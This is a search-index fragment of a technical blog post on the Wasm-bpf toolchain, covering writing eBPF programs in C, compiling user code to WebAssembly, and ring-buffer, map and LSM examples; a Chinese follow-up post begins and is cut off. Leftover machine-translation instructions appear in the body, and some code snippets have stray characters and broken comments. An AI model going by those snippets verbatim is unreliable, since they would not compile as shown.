systems, as well as secure networks and service meshes.</p> <p>WebAssembly (Wasm) was initially developed for browser security sandbox purposes. As of now, WebAssembly has evolved into a high-performance, cross-platform, and multi-language software sandbox environment for cloud-native software components. The lightweight nature of Wasm containers makes them suitable for running as the next-generation serverless platform runtime or for efficient execution in resource-constrained scenarios such as edge computing.</p> <p>Now, with the help of the Wasm-bpf compilation toolchain and runtime, we can use Wasm to write eBPF programs as cross-platform modules, while using C/C++ or Rust to write Wasm programs. By using eBPF programs in WebAssembly, we not only enable Wasm applications to benefit from the high performance and access to system interfaces of eBPF, but also allow eBPF programs to leverage the sandboxing, flexibility, cross-platform nature, and dynamic loading of Wasm. Additionally, we can conveniently and quickly distribute and manage eBPF programs using Wasm OCI images. Combining these two technologies will provide a completely new development experience for the eBPF and Wasm ecosystems!</p>"},{"location":"blogs/how-to-write-c-in-wasm/#writing-dynamically-loading-and-distributing-ebpf-programs-in-wasm-with-the-wasm-bpf-toolchain","title":"Writing, Dynamically Loading, and Distributing eBPF Programs in Wasm with the Wasm-bpf Toolchain","text":"<p>Wasm-bpf is a new open-source project: https://github.com/eunomia-bpf/wasm-bpf. It defines an abstraction for the eBPF-related system interfaces and provides a corresponding development toolchain, library, and a general Wasm + eBPF runtime instance. It can provide a similar development experience to libbpf-bootstrap, automatically generating skeleton header files and data structure definitions for unordered communication between Wasm and eBPF. With this toolchain, you can easily build your own Wasm-eBPF runtime in any language on any platform. For more details, please refer to our previous blog post: Wasm-bpf: Bridging WebAssembly and eBPF Kernel Programmability.</p> <p>With Wasm, we can build eBPF applications using multiple languages and manage and distribute them in a unified and lightweight manner. As an example, our sample application bootstrap.wasm is only ~90K in size, making it easy to distribute over the network and dynamically deploy, load, and run on another machine in less than 100ms, while retaining the isolation characteristics of lightweight containers. The runtime does not require kernel headers, LLVM, clang, or any resource-consuming heavy compilation work.</p> <p>This article will discuss writing and compiling eBPF programs in C/C++ and converting them into Wasm modules. A specific example of writing and compiling eBPF programs in Rust and converting them into Wasm modules will be described in the next article.</p> <p>We provide several sample programs in the repository, each corresponding to different scenarios such as observability, networking, and security.</p>"},{"location":"blogs/how-to-write-c-in-wasm/#writing-ebpf-programs-in-cc-and-compiling-into-wasm","title":"Writing eBPF Programs in C/C++ and Compiling into Wasm","text":"<p>libbpf is a C/C++ user space loading and control library for eBPF and has become the de facto API standard for eBPF user space. libbpf also supports the CO-RE (Compile Once - Run Everywhere) solution, which allows precompiled BPF code to work on different kernel versions without the need to recompile for each specific kernel. We aim to maintain compatibility and minimize migration costs to Wasm (if necessary) by keeping the user space API and behavior consistent with libbpf.</p> <p>libbpf-bootstrap provides templates for generating libbpf-based BPF programs, making it easy for developers to generate custom BPF programs. In general, outside the Wasm sandbox, using the libbpf-bootstrap scaffolding, you can quickly and easily build BPF applications using C/C++.</p> <p>The compilation, building, and running of eBPF programs (regardless of the programming language) usually involve the following steps:</p> <ul> <li>Write the code for the kernel space eBPF program, generally using C/C++ or Rust.</li> <li>Compile the eBPF program using the clang compiler or related toolchains (including BTF information to achieve cross-kernel version portability).</li> <li>In the user space development program, write the corresponding logic for loading, controlling, mounting, and processing data.</li> <li>During runtime, load the eBPF program into the kernel from the user space and execute it.</li> </ul>"},{"location":"blogs/how-to-write-c-in-wasm/#bootstrap","title":"bootstrap","text":"<p><code>bootstrap</code> is a simple (but practical) example of a BPF application. It tracks the startup (specifically, the <code>exec()</code> series of system calls) and exit of processes, and sends data about the file name, PID, and parent PID, as well as the exit status and duration of the process. With <code>-d &lt;min-duration-ms&gt;</code>, you can specify the minimum duration of the processes to be recorded.</p> <p><code>bootstrap</code> is created based on the similar idea of libbpf-tools in the BCC package, but it is designed to be more independent and has a simpler Makefile to simplify user's specific needs. It demonstrates typical BPF features, including cooperation with multiple BPF program segments, maintaining state using BPF maps, sending data to userspace using BPF ring buffer, and parameterizing application behavior using global variables.</p> <p>Here is an example output of running <code>bootstrap</code> by compiling it with Wasm:</p> <pre><code>$ sudo sudo ./wasm-bpf bootstrap.wasm -h\nBPF bootstrap demo application.\n\nIt traces process start and exits and shows associated\ninformation (filename, process duration, PID and PPID, etc).\n\nUSAGE: ./bootstrap [-d &lt;min-duration-ms&gt;] -v\n$ sudo ./wasm-bpf bootstrap.wasm\nTIME     EVENT COMM             PID     PPID    FILENAME/EXIT CODE\n18:57:58 EXEC  sed              74911   74910   /usr/bin/sed\n18:57:58 EXIT  sed              74911   74910   [0] (2ms)\n18:57:58 EXIT  cat              74912   74910   [0] (0ms)\n18:57:58 EXEC  cat              74913   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74913   74910   [0] (0ms)\n18:57:59 EXEC  cat              74914   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74914   74910   [0] (0ms)\n18:57:59 EXEC  cat              74915   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74915   74910   [0] (1ms)\n18:57:59 EXEC  sleep            74916   74910   /usr/bin/sleep\n</code></pre> <p>We can provide a development experience similar to libbpf-bootstrap. Just run <code>make</code> to build the wasm binary:</p> <pre><code>git clone https://github.com/eunomia-bpf/wasm-bpf --recursive\ncd examples/bootstrap\nmake\n</code></pre>"},{"location":"blogs/how-to-write-c-in-wasm/#writing-ebpf-programs-in-kernel-space","title":"Writing eBPF programs in kernel space","text":"<p>To build a complete eBPF program, you need to first write the BPF code in kernel space. This is typically done using the C language and compiled using clang:</p> <pre><code>char LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\".const volatile unsigned long long min_duration_ns = 0;\nconst volatile int *name_ptr;\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    struct task_struct *task;\n    unsigned fname_off;\n    struct event *e;\n    pid_t pid;\n    u64 ts;\n....\n</code></pre> <p>Due to space constraints, the full code is not shown here. The way to write kernel code is exactly the same as other libbpf-based programs. Generally, it includes some global variables, eBPF functions declared with <code>SEC</code> for mounting points, and map objects used to store state or communicate between user space and kernel space (we are also doing other work in progress: bcc to libbpf converter, and once it is completed, you will be able to compile BCC-style eBPF kernel code in this way). After writing the eBPF program, running <code>make</code> will invoke clang and llvm-strip in the <code>Makefile</code> to build the BPF program and remove debug information:</p> <pre><code>clang -g -O2 -target bpf -D__TARGET_ARCH_x86 -I../../third_party/vmlinux/x86/ -idirafter /usr/local/include -idirafter /usr/include -c bootstrap.bpf.c -o bootstrap.bpf.o\nllvm-strip -g bootstrap.bpf.o # strip useless DWARF info\n</code></pre> <p>Then we provide a specialized bpftool for Wasm, which generates C header files from BPF programs:</p> <pre><code>../../third_party/bpftool/src/bpftool gen skeleton -j bootstrap.bpf.o &gt; bootstrap.skel.h\n</code></pre> <p>Since the C memory layout for eBPF itself is the same as the instruction set of the current machine, but Wasm has a specific memory layout (e.g., the current machine is 64-bit, and the Wasm virtual machine is 32-bit, so the C struct layout, pointer width, endianness, etc. may be different), in order to ensure that eBPF programs can communicate correctly with Wasm, we need to customize a specialized bpftool and other tools to generate a user space development framework that can work in Wasm.</p> <p>The skeleton contains a skeleton for a BPF program, used to manipulate BPF objects and control the lifecycle of the BPF program, for example:</p> <pre><code>    struct bootstrap_bpf {\n        struct bpf_object_skeleton *skeleton;\n        struct bpf_object *obj;\n        struct {\n            struct bpf_map *exec_start;\n            struct bpf_map *rb;\n            struct bpf_map *rodata;\n        } maps;\n        struct {\n            struct bpf_program *handle_exec;\n            struct bpf_program *handle_exit;\n        } progs;\n        struct bootstrap_bpf__rodata {\n            unsigned long long min_duration_ns;\n        } *rodata;\n        struct bootstrap_bpf__bss {\n            uint64_t /* pointer */ name_ptr;\n        } *bss;\n    };\n</code></pre> <p>We will convert all pointers to integers based on the pointer size of the eBPF program's target instruction set, for example, <code>name_ptr</code>. In addition, padding bytes will be explicitly added to the structure to ensure that the structure layout matches the target, for example using <code>char __pad0[4];</code>. We will also use <code>static_assert</code> to ensure that the size of the structure matches the type length in the original BTF (BPF Type Format) information.### Building User-Space Wasm Code and Accessing Kernel-Space Data</p> <p>We assume the use of wasi-sdk to build the wasm binary from C/C++ code. You can also use the emcc toolchain to build the wasm binary, and the commands should be similar. You can run the following command to install wasi-sdk:</p> <pre><code>wget https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-17/wasi-sdk-17.0-linux.tar.gz\ntar -zxf wasi-sdk-17.0-linux.tar.gz\nsudo mkdir -p /opt/wasi-sdk/ &amp;&amp; sudo mv wasi-sdk-17.0/* /opt/wasi-sdk/\n</code></pre> <p>Then running <code>make</code> will compile the C code to generate the Wasm bytecode in the <code>Makefile</code> using wasi-clang:</p> <pre><code>/opt/wasi-sdk/bin/clang -O2 --sysroot=/opt/wasi-sdk/share/wasi-sysroot -Wl,--allow-undefined -o bootstrap.wasm bootstrap.c\n</code></pre> <p>Since the C structure layout on the host (or eBPF side) might be different from the target (Wasm side), you can use ecc and our wasm-bpftool to generate the C header file for the user-space code:</p> <pre><code>ecc bootstrap.h --header-only\n../../third_party/bpftool/src/bpftool btf dump file bootstrap.bpf.o format c -j &gt; bootstrap.wasm.h\n</code></pre> <p>For example, the original kernel-side header file contains the following structure definition:</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n    char filename[MAX_FILENAME_LEN];\n    char exit_event;\n};\n</code></pre> <p>Our tool will transform it to:</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned int exit_code;\n    char __pad0[4];\n    unsigned long long duration_ns;\n    char comm[16];\n    char filename[127];\n    char exit_event;\n} __attribute__((packed));\nstatic_assert(sizeof(struct event) == 168, \"Size of event is not 168\");\n</code></pre> <p>Note: This process and tool are not always necessary. For simple applications, you can do it manually. For cases where both kernel-side and Wasm applications use C/C++ languages, you can manually write all event structure definitions, use <code>__attribute__((packed))</code> to avoid padding bytes, and convert all pointers between the host and Wasm side to the correct integers. All types must have the same size and layout as the host on the Wasm side.</p> <p>For complex programs, manually confirming the correct memory layout is difficult. Therefore, we have created a Wasm-specific <code>bpftool</code> that generates a C header file containing all type definitions and the correct structure layout from <code>BTF</code> information for user-space code. By using a similar approach, you can convert all structure definitions in the eBPF program to the memory layout on the Wasm side at once, ensuring endianness consistency to access correctly.</p> <p>For cases where Wasm is not developed using the C language, with the help of Wasm's component model, we can also output these BTF information structure definitions as wit type declarations, and then use the wit-bindgen tool in user-space code to generate type definitions for multiple languages (such as C/C++/Rust/Go) at once. This will be described in detail in the section on how to write eBPF programs in Rust in Wasm, and we will continue to improve these steps and toolchains to enhance the programming experience of Wasm-bpf programs.</p> <p>We provide a libbpf API library for Wasm programs that includes only header files. You can find it in libbpf-wasm.h (wasm-include/libbpf-wasm.h), which contains some commonly used user-space libbpf APIs and type definitions. Wasm programs can use the libbpf API to manipulate BPF objects, for example:</p> <p>```c\"./ Load and verify BPF application / skel = bootstrap_bpf__open(); / Parameterize BPF code with minimum duration parameter / skel-&gt;rodata-&gt;min_duration_ns = env.min_duration_ms * 1000000ULL; / Load &amp; verify BPF programs / err = bootstrap_bpf__load(skel); / Attach tracepoints / err = bootstrap_bpf__attach(skel);</p> <p>The rodata section is used to store constants in the BPF program, and these values will be mapped to the correct offsets in the object file generated by bpftool gen skeleton. After opening, the values can be modified through memory mapping, so there is no need to compile the libelf library in Wasm. The BPF object can still be dynamically loaded and manipulated at runtime.</p> <p>The C code on the Wasm side is slightly different from the local libbpf code, but it can provide most of the functionalities from the eBPF side. For example, polling from a ring buffer or perf buffer, accessing maps from both the Wasm and eBPF sides, loading, attaching, and detaching BPF programs, etc. It can support a wide range of eBPF program types and maps, covering most use cases of eBPF programs in domains such as tracing, networking, and security.</p> <p>Due to the lack of certain functionalities on the Wasm side, such as signal handler support (as of February 2023), the original C code may not be directly compilable to wasm. You may need to make slight modifications to the code to make it work. We will make best efforts to make the libbpf API on the wasm side as similar as possible to the libbpf API typically used in user space so that user space code can be directly compiled to wasm in the future. We will also provide more language bindings (e.g., Go) for wasm-based eBPF program development libraries as soon as possible.</p> <p>You can use the polling API in user space programs to retrieve data uploaded from kernel space. It is a wrapper for the ring buffer and perf buffer, allowing user space code to use the same API to poll events from either a ring buffer or a perf buffer, depending on the type specified in the BPF program. For example, ring buffer polling is defined as <code>BPF_MAP_TYPE_RINGBUF</code>:</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n</code></pre> <p>You can use the following code in user space to poll events from the ring buffer:</p> <pre><code>rb = bpf_buffer__open(skel-&gt;maps.rb, handle_event, NULL);\n/* Process events */\nprintf(\"%-8s %-5s %-16s %-7s %-7s %s\\n\", \"TIME\", \"EVENT\", \"COMM\", \"PID\",\n       \"PPID\", \"FILENAME/EXIT CODE\");\nwhile (!exiting) {\n    // poll buffer\n    err = bpf_buffer__poll(rb, 100 /* timeout, ms */);\n</code></pre> <p>Ring buffer polling does not require serialization overhead. The bpf_buffer__poll API will call the handle_event callback function to process event data from the ring buffer:</p> <pre><code>static int\nhandle_event(void *ctx, void *data, size_t data_sz)\n{\n    const struct event *e = data;\n    ...\n    if (e-&gt;exit_event) {\n        printf(\"%-8s %-5s %-16s %-7d %-7d [%u]\", ts, \"EXIT\", e-&gt;comm, e-&gt;pid,\n               e-&gt;ppid, e-&gt;exit_code);\n        if (e-&gt;duration_ns)\n            printf(\" (%llums)\", e-&gt;duration_ns / 1000000);\n        printf(\"\\n\");\n    }\n    ...\n    return 0;\n}\n```The Markdown content has been translated to English while preserving the original formatting:\n\n\"Runtime is based on the libbpf CO-RE (Compile Once, Run Everywhere) API, which is used to load BPF objects into the kernel. Therefore, wasm-bpf programs are not affected by the kernel version they are compiled with and can run on any kernel version that supports BPF CO-RE.\n\n### Accessing and updating map data of eBPF programs from user-space programs\n\nrunqlat is a more complex example that shows the scheduler run queue latency through a histogram, displaying how long a task has waited to run.\n\n```console\n$ sudo ./wasm-bpf runqlat.wasm -h\nSummarize run queue (scheduler) latency as a histogram.\n\nUSAGE: runqlat [--help] [interval] [count]\n\nEXAMPLES:\n    runqlat         # summarize run queue latency as a histogram\n    runqlat 1 10    # print 1 second summaries, 10 times\n$ sudo ./wasm-bpf runqlat.wasm 1\n\nTracing run queue latency... Hit Ctrl-C to end.\n\n     usecs               : count    distribution\n         0 -&gt; 1          : 72       |*****************************           |\n         2 -&gt; 3          : 93       |*************************************   |\n         4 -&gt; 7          : 98       |****************************************|\n         8 -&gt; 15         : 96       |*************************************** |\n        16 -&gt; 31         : 38       |***************                         |\n        32 -&gt; 63         : 4        |*                                       |\n        64 -&gt; 127        : 5        |**                                      |\n       128 -&gt; 255        : 6        |**                                      |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 1        |                                        |\n</code></pre> <p>In runqlat, the <code>map</code> API is used to access and directly read data from a <code>map</code> in the kernel from user-space, for example:</p> <pre><code>    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_lookup_elem(fd, &amp;next_key, &amp;hist);\n        ...\n        lookup_key = next_key;\n    }\n    lookup_key = -2;\n    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_delete_elem(fd, &amp;next_key);\n        ...\n        lookup_key = next_key;\n    }\n```\".Instructions: Translate the following Chinese text to English \nwhile maintaining the original formatting: \"When running wasm code, shared memory will be used to access the kernel map. The kernel space can directly copy data to the stack of the Wasm virtual machine in user space, without the additional copy overhead between the user space host program and the Wasm runtime. Similarly, for type definitions shared between the Wasm virtual machine and the kernel space, careful checking is required to ensure that they have consistent types in both Wasm and kernel space.\n\nThe `bpf_map_update_elem` function can be used to update the eBPF map in user space programs to update the kernel's eBPF map, for example:\n\n```c\n        cg_map_fd = bpf_map__fd(obj-&gt;maps.cgroup_map);\n        cgfd = open(env.cgroupspath, O_RDONLY);\n        if (cgfd &lt; 0) {\n            ...\n        }\n        if (bpf_map_update_elem(cg_map_fd, &amp;idx, &amp;cgfd, BPF_ANY)) {\n            ...\n        }\n</code></pre> <p>Therefore, the eBPF program in the kernel can obtain configurations from the Wasm program side, or receive messages during runtime.</p>"},{"location":"blogs/how-to-write-c-in-wasm/#more-examples-socket-filter-and-lsm","title":"More examples: socket filter and LSM","text":"<p>In the repository, we also provide more examples, such as using socket filters to monitor and filter packets:</p> <pre><code>SEC(\"socket\")\nint socket_handler(struct __sk_buff *skb)\n{\n    struct so_event *e;\n    __u8 verlen;\n    __u16 proto;\n    __u32 nhoff = ETH_HLEN;\n\n    bpf_skb_load_bytes(skb, 12, &amp;proto, 2);\n    ...\n\n    bpf_skb_load_bytes(skb, nhoff + 0, &amp;verlen, 1);\n    bpf_skb_load_bytes(skb, nhoff + ((verlen &amp; 0xF) &lt;&lt; 2), &amp;(e-&gt;ports), 4);\n    e-&gt;pkt_type = skb-&gt;pkt_type;\n    e-&gt;ifindex = skb-&gt;ifindex;\n    bpf_ringbuf_submit(e, 0);\n\n    return skb-&gt;len;\n}\n</code></pre> <p>Linux Security Modules (LSM) is a hook-based framework for implementing security policies and mandatory access control in the Linux kernel. Until now, there have been two choices for enforcing security policy goals: configuring existing LSM modules (such as AppArmor and SELinux) or writing custom kernel modules.</p> <p>Linux Kernel 5.7 introduces a third option: LSM eBPF. LSM BPF allows developers to write custom policies without configuring or loading kernel modules. LSM BPF programs are verified at load time and then executed when reaching the LSM hook in the call path. For example, we can use LSM in a Wasm lightweight container to restrict file system operations:</p> <pre><code>// all lsm the hook point refer https://www.kernel.org/doc/html/v5.2/security/LSM.html\nSEC(\"lsm/path_rmdir\")\nint path_rmdir(const struct path *dir, struct dentry *dentry) {\n  char comm[16];\n  bpf_get_current_comm(comm, sizeof(comm));\n  unsigned char dir_name[] = \"can_not_rm\";\n  unsigned char d_iname[32];\n  bpf_probe_read_kernel(&amp;d_iname[0], sizeof(d_iname),\n                        &amp;(dir-&gt;dentry-&gt;d_iname[0]));\n\n  bpf_printk(\"comm %s try to rmdir %s\", comm, d_iname);\n  for (int i = 0;i&lt;sizeof(dir_name);i++){\n    if (d_iname[i]!=dir_name[i]){\n        return 0;\n    }\n  }\n  return -1;\n}\n</code></pre>"},{"location":"blogs/how-to-write-c-in-wasm/#summary","title":"Summary","text":"<p>In this example, we discuss how to use C/C++ language to write eBPF programs and compile them into Wasm modules. For more complete code, please refer to our GitHub repository: https://github.com/eunomia-bpf/wasm-bpf.</p> <p>In the next article, we will discuss how to write eBPF programs using Rust and compile them into Wasm modules. We will also cover using OCI images to publish, deploy, and manage eBPF programs, similar to the experience with Docker.</p> <p>Next, we will continue to improve the experience of developing and running eBPF programs in multiple languages within Wasm. We will provide more comprehensive examples, user-level development libraries/toolchains, and more specific use cases.</p>"},{"location":"blogs/how-to-write-c-in-wasm/#reference","title":"Reference","text":"<ul> <li>wasm-bpf GitHub repository: https://github.com/eunomia-bpf/wasm-bpf</li> <li>What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>Anolis Community eBPF Technology Exploration SIG: https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf project: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>eunomia-bpf project Anolis Gitee mirror: https://gitee.com/anolis/eunomia</li> <li>Wasm-bpf: Bridging the gap between WebAssembly and eBPF kernel programming: https://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>When WASM meets eBPF: Writing, distributing, loading, and running eBPF programs using WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>Teaching you how to use eBPF LSM to hotfix Linux kernel vulnerabilities: https://www.bilibili.com/read/cv19597563</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/how-to-write-rust-in-wasm/","title":"\u5728 WebAssembly \u4e2d\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u53d1\u5e03 OCI \u955c\u50cf","text":"<p>\u4f5c\u8005\uff1a\u4e8e\u6850\uff0c\u90d1\u6631\u7b19</p> <p>eBPF\uff08extended Berkeley Packet Filter\uff09\u662f\u4e00\u79cd\u9ad8\u6027\u80fd\u7684\u5185\u6838\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u4e2d\uff0c\u4ee5\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u3002\u968f\u7740\u8ba1\u7b97\u673a\u6280\u672f\u7684\u4e0d\u65ad\u53d1\u5c55\uff0ceBPF \u7684\u529f\u80fd\u65e5\u76ca\u5f3a\u5927\uff0c\u5e76\u4e14\u5df2\u7ecf\u6210\u4e3a\u5404\u79cd\u6548\u7387\u9ad8\u6548\u7684\u5728\u7ebf\u8bca\u65ad\u548c\u8ddf\u8e2a\u7cfb\u7edf\uff0c\u4ee5\u53ca\u6784\u5efa\u5b89\u5168\u7684\u7f51\u7edc\u3001\u670d\u52a1\u7f51\u683c\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002</p> <p>WebAssembly\uff08Wasm\uff09\u6700\u521d\u662f\u4ee5\u6d4f\u89c8\u5668\u5b89\u5168\u6c99\u76d2\u4e3a\u76ee\u7684\u5f00\u53d1\u7684\uff0c\u53d1\u5c55\u5230\u76ee\u524d\u4e3a\u6b62\uff0cWebAssembly \u5df2\u7ecf\u6210\u4e3a\u4e00\u4e2a\u7528\u4e8e\u4e91\u539f\u751f\u8f6f\u4ef6\u7ec4\u4ef6\u7684\u9ad8\u6027\u80fd\u3001\u8de8\u5e73\u53f0\u548c\u591a\u8bed\u8a00\u8f6f\u4ef6\u6c99\u7bb1\u73af\u5883\uff0cWasm \u8f7b\u91cf\u7ea7\u5bb9\u5668\u4e5f\u975e\u5e38\u9002\u5408\u4f5c\u4e3a\u4e0b\u4e00\u4ee3\u65e0\u670d\u52a1\u5668\u5e73\u53f0\u8fd0\u884c\u65f6\uff0c\u6216\u5728\u8fb9\u7f18\u8ba1\u7b97\u7b49\u8d44\u6e90\u53d7\u9650\u7684\u573a\u666f\u9ad8\u6548\u6267\u884c\u3002</p> <p>\u73b0\u5728\uff0c\u501f\u52a9 Wasm-bpf \u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Wasm \u5c06 eBPF \u7a0b\u5e8f\u7f16\u5199\u4e3a\u8de8\u5e73\u53f0\u7684\u6a21\u5757\uff0c\u4f7f\u7528 C/C++ \u548c Rust \u7f16\u5199\u7a0b\u5e8f\u3002\u901a\u8fc7\u5728 WebAssembly \u4e2d\u4f7f\u7528 eBPF \u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u4ec5\u8ba9 Wasm \u5e94\u7528\u83b7\u5f97 eBPF \u7684\u9ad8\u6027\u80fd\u3001\u5bf9\u7cfb\u7edf\u63a5\u53e3\u7684\u8bbf\u95ee\u80fd\u529b\uff0c\u8fd8\u53ef\u4ee5\u8ba9 eBPF \u7a0b\u5e8f\u4eab\u53d7\u5230 Wasm \u7684\u6c99\u7bb1\u3001\u7075\u6d3b\u6027\u3001\u8de8\u5e73\u53f0\u6027\u3001\u548c\u52a8\u6001\u52a0\u8f7d\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f7f\u7528 Wasm \u7684 OCI \u955c\u50cf\u6765\u65b9\u4fbf\u3001\u5feb\u6377\u5730\u5206\u53d1\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u7c7b\u4f3c docker \u4e00\u6837\uff0c\u4ece\u4e91\u7aef\u4e00\u884c\u547d\u4ee4\u83b7\u53d6 Wasm \u8f7b\u91cf\u7ea7\u5bb9\u5668\u955c\u50cf\uff0c\u5e76\u8fd0\u884c\u4efb\u610f eBPF \u7a0b\u5e8f\u3002\u901a\u8fc7\u7ed3\u5408\u8fd9\u4e24\u79cd\u6280\u672f\uff0c\u6211\u4eec\u5c06\u4f1a\u7ed9 eBPF \u548c Wasm \u751f\u6001\u6765\u4e00\u4e2a\u5168\u65b0\u7684\u5f00\u53d1\u4f53\u9a8c\uff01</p>"},{"location":"blogs/how-to-write-rust-in-wasm/#wasm-bpf-wasm-ebpf","title":"\u4f7f\u7528 Wasm-bpf \u5de5\u5177\u94fe\u5728 Wasm \u4e2d\u7f16\u5199\u3001\u52a8\u6001\u52a0\u8f7d\u3001\u5206\u53d1\u8fd0\u884c eBPF \u7a0b\u5e8f","text":"<p>\u5728\u524d\u4e24\u7bc7\u77ed\u6587\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86 Wasm-bpf \u7684\u8bbe\u8ba1\u601d\u8def\uff0c\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528 C/C++ \u5728 Wasm \u4e2d\u7f16\u5199 eBPF \u7a0b\u5e8f:</p> <ul> <li>Wasm-bpf: \u67b6\u8d77 Webassembly \u548c eBPF \u5185\u6838\u53ef\u7f16\u7a0b\u7684\u6865\u6881: https://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>\u5728 WebAssembly \u4e2d\u4f7f\u7528 C/C++ \u548c libbpf \u7f16\u5199 eBPF \u7a0b\u5e8f: https://zhuanlan.zhihu.com/p/605542090</li> </ul> <p>\u57fa\u4e8e Wasm\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\u6784\u5efa eBPF \u5e94\u7528\uff0c\u5e76\u4ee5\u7edf\u4e00\u3001\u8f7b\u91cf\u7ea7\u7684\u65b9\u5f0f\u7ba1\u7406\u548c\u53d1\u5e03\u3002\u4ee5\u6211\u4eec\u6784\u5efa\u7684\u793a\u4f8b\u5e94\u7528 bootstrap.wasm \u4e3a\u4f8b\uff0c\u4f7f\u7528 C/C++ \u6784\u5efa\u7684\u955c\u50cf\u5927\u5c0f\u6700\u5c0f\u4ec5\u4e3a ~90K\uff0c\u5f88\u5bb9\u6613\u901a\u8fc7\u7f51\u7edc\u5206\u53d1\uff0c\u5e76\u53ef\u4ee5\u5728\u4e0d\u5230 100ms \u7684\u65f6\u95f4\u5185\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u52a8\u6001\u90e8\u7f72\u3001\u52a0\u8f7d\u548c\u8fd0\u884c\uff0c\u5e76\u4e14\u4fdd\u7559\u8f7b\u91cf\u7ea7\u5bb9\u5668\u7684\u9694\u79bb\u7279\u6027\u3002\u8fd0\u884c\u65f6\u4e0d\u9700\u8981\u5185\u6838\u7279\u5b9a\u7248\u672c\u5934\u6587\u4ef6\u3001LLVM\u3001clang \u7b49\u4f9d\u8d56\uff0c\u4e5f\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u6d88\u8017\u8d44\u6e90\u7684\u91cd\u91cf\u7ea7\u7684\u7f16\u8bd1\u5de5\u4f5c\u3002\u5bf9\u4e8e Rust \u800c\u8a00\uff0c\u7f16\u8bd1\u4ea7\u7269\u4f1a\u7a0d\u5927\u4e00\u70b9\uff0c\u5927\u7ea6\u5728 2M \u5de6\u53f3\u3002</p> <p>\u672c\u6587\u5c06\u4ee5 Rust \u8bed\u8a00\u4e3a\u4f8b\uff0c\u8ba8\u8bba\uff1a</p> <ul> <li>\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757</li> <li>\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u3001\u90e8\u7f72\u3001\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u83b7\u5f97\u7c7b\u4f3c Docker \u7684\u4f53\u9a8c</li> </ul> <p>\u6211\u4eec\u5728\u4ed3\u5e93\u4e2d\u63d0\u4f9b\u4e86\u51e0\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u5206\u522b\u5bf9\u5e94\u4e8e\u53ef\u89c2\u6d4b\u3001\u7f51\u7edc\u3001\u5b89\u5168\u7b49\u591a\u79cd\u573a\u666f\u3002</p>"},{"location":"blogs/how-to-write-rust-in-wasm/#ebpf-wasm","title":"\u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u7684\u5927\u81f4\u6d41\u7a0b","text":"<p>\u4e00\u822c\u8bf4\u6765\uff0c\u5728\u975e Wasm \u6c99\u7bb1\u7684\u7528\u6237\u6001\u7a7a\u95f4\uff0c\u4f7f\u7528 libbpf-bootstrap \u811a\u624b\u67b6\uff0c\u53ef\u4ee5\u5feb\u901f\u3001\u8f7b\u677e\u5730\u4f7f\u7528 C/C++\u6784\u5efa BPF \u5e94\u7528\u7a0b\u5e8f\u3002\u7f16\u8bd1\u3001\u6784\u5efa\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff08\u65e0\u8bba\u662f\u91c7\u7528\u4ec0\u4e48\u8bed\u8a00\uff09\uff0c\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u7f16\u5199\u5185\u6838\u6001 eBPF 